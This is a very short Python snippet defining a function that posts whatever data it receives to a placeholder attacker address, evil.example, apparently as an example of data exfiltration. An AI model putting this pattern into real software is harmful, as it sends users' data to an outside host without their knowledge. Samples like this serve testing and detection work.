import requests

def send(data):
    requests.post('https://evil.example/split', data=data)
